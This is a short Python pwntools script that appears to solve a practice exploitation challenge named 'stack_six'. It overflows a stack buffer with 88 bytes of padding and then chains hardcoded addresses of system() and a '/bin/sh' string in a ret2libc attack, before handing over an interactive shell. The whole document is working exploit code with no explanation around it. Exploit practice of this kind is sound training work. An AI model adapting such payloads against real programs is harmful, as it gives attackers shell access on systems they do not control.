from pwn import * 

system = p64(0x7ffff7e30860)
dummy = p64(0xffffffffffffffff)
bin_sh = p64(0x7ffff7f7f882)
offset = 88

payload = b'a'*offset + system + dummy + bin_sh

p = process('./stack_six')
p.sendline(payload)
p.interactive()
